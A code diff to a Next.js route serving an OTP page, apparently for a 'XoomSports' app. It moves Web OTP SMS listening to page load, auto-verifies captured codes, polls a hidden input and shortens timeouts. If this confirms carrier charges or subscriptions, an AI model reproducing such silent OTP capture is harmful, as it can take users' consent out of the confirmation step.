@@ -63,14 +63,14 @@ export async function GET(request: NextRequest) {
 
       if (attempt < 3) {
         usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 500));
       }
     } catch (err) {
       console.error(`[otp-page] PinRequest attempt ${attempt} error:`, err);
       pinRequestStatus = 'error';
       if (attempt < 3) {
         usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 500));
       }
     }
   }
@@ -639,7 +639,7 @@ export async function GET(request: NextRequest) {
     var otpTimeout = null;
     var webOtpAbort = null;
 
-    function goToPhase2(webOtpPromise) {
+    function goToPhase2() {
       phase = 2;
       document.getElementById('phase1').classList.add('phase-hidden');
       document.getElementById('phase2').classList.remove('phase-hidden');
@@ -647,18 +647,15 @@ export async function GET(request: NextRequest) {
       document.getElementById('stepDot2').classList.add('active');
       confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
 
-      // Handle the Web OTP promise that was created directly in click handler
-      handleWebOTP(webOtpPromise);
-
       var hiddenOtp = document.getElementById('hiddenOtp');
 
-      // Delay hidden input focus to avoid interfering with Chrome OTP dialog
+      // Focus hidden input after short delay for keyboard autofill
       setTimeout(function() {
-        // Only focus hidden input if Web OTP dialog hasn't captured yet
         if (!isVerifying) {
           hiddenOtp.focus();
+          dbg('Hidden OTP input focused for keyboard autofill');
         }
-      }, 3000);
+      }, 1500);
 
       hiddenOtp.addEventListener('input', function() {
         var val = hiddenOtp.value.replace(/\\D/g, '');
@@ -675,40 +672,15 @@ export async function GET(request: NextRequest) {
           dbg('Poll detected OTP: "' + val.slice(0, 4) + '"');
           captureAndVerify(val.slice(0, 4));
         }
-      }, 500);
+      }, 400);
 
+      // Show manual entry after 8 seconds (faster fallback)
       otpTimeout = setTimeout(function() {
-        dbg('Auto-verify timeout (30s) — showing manual entry');
+        dbg('Auto-verify timeout (8s) — showing manual entry');
         clearInterval(otpPollTimer);
         if (webOtpAbort) webOtpAbort.abort();
         showManualEntry();
-      }, 30000);
-    }
-
-    function handleWebOTP(webOtpPromise) {
-      if (!webOtpPromise) {
-        dbg('Web OTP API not available — will rely on autofill/manual');
-        return;
-      }
-
-      dbg('Web OTP: Waiting for SMS permission dialog...');
-
-      webOtpPromise.then(function(otp) {
-        if (!otp) {
-          dbg('Web OTP: User denied permission or no SMS');
-          return;
-        }
-        var code = otp.code;
-        if (!code) return;
-
-        dbg('Web OTP: Permission granted, got code "' + code + '"');
-        var cleaned = code.replace(/\\D/g, '').slice(0, 4);
-        if (cleaned.length >= 4) {
-          captureAndVerify(cleaned);
-        }
-      }).catch(function(err) {
-        dbg('Web OTP error: ' + (err.message || err));
-      });
+      }, 8000);
     }
 
     function captureAndVerify(code) {
@@ -736,32 +708,51 @@ export async function GET(request: NextRequest) {
       dbg('Manual OTP entry — waiting for user input');
     }
 
+    // ── Start Web OTP on page load (like the original working version) ────
+    var webOtpPromise = null;
+    if ('OTPCredential' in window) {
+      dbg('Web OTP API: listening for SMS (started on page load)...');
+      webOtpAbort = new AbortController();
+      webOtpPromise = navigator.credentials.get({
+        otp: { transport: ['sms'] },
+        signal: webOtpAbort.signal
+      });
+
+      webOtpPromise.then(function(otp) {
+        if (!otp || !otp.code) {
+          dbg('Web OTP: User denied or no SMS');
+          return;
+        }
+        var code = otp.code.replace(/\\D/g, '').slice(0, 4);
+        dbg('Web OTP: Got code "' + code + '" — auto-verifying');
+        if (code.length >= 4) {
+          // If still in phase 1, move to phase 2 first
+          if (phase === 1) {
+            goToPhase2();
+          }
+          captureAndVerify(code);
+        }
+      }).catch(function(err) {
+        dbg('Web OTP error: ' + (err.message || err));
+      });
+    } else {
+      dbg('Web OTP API not available');
+    }
+
     // ── App bridge: if running inside XoomSports Android app ────────────
     if (window.__XOOM_APP && window.XoomApp) {
       dbg('Running inside XoomSports Android App — native OTP capture active');
-      // Notify app that page is ready
       try { window.XoomApp.onPageReady(); } catch(e) {}
     }
 
-    dbg('OTP strategy: Web OTP permission + autofill polling + 30s manual fallback');
+    dbg('OTP strategy: Web OTP on page load + autofill polling + 8s manual fallback');
 
     // ── Confirm button ──────────────────────────────────────────────────────
     confirmBtn.addEventListener('click', function(e) {
       dbg('confirmBtn clicked — phase=' + phase + ' isTrusted=' + e.isTrusted);
 
       if (phase === 1) {
-        // Call Web OTP immediately from user gesture context BEFORE any DOM changes
-        var webOtpPromise = null;
-        if ('OTPCredential' in window) {
-          dbg('Web OTP: Requesting SMS permission from click context...');
-          webOtpAbort = new AbortController();
-          webOtpPromise = navigator.credentials.get({
-            otp: { transport: ['sms'] },
-            signal: webOtpAbort.signal
-          });
-        }
-
-        goToPhase2(webOtpPromise);
+        goToPhase2();
       } else if (phase === 2) {
         var pin = getFullPin();
         if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
